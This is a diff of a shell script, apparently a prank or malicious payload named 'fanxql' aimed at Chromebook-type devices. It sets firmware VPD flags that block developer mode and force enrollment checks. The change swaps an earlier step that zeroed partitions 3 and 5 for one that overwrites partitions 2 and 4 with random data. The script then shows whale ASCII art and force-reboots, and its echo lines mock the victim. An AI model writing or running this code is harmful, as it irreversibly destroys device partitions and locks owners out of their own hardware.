@@ -1,4 +1,5 @@
 #!/bin/sh
+echo "starting persistence in fanxql injection..."
 
 vpd -i RW_VPD -s block_devmode=1 >/dev/null 2>&1
 vpd -i RW_VPD -s check_enrollment=1 >/dev/null 2>&1
@@ -38,10 +39,11 @@ if echo "$TARGET_DEVICE" | grep -q '[0-9]$'; then
 else
 	TARGET_DEVICE_P="$TARGET_DEVICE"
 fi
-dd if=/dev/zero of="$TARGET_DEVICE_P"3 >/dev/null 2>&1
-dd if=/dev/zero of="$TARGET_DEVICE_P"5 >/dev/null 2>&1
-echo "get fanxql'd haha :whale:"
-sleep 0.5
+dd if=/dev/urandom of="$TARGET_DEVICE_P"2 >/dev/null 2>&1 # tuff!
+dd if=/dev/urandom of="$TARGET_DEVICE_P"4 >/dev/null 2>&1
+echo "Done!" 
+sleep 4
 clear
 cat "$PAYLOAD_DIR/whale.txt"
-sleep infinity
+sleep 0.3
+reboot -f
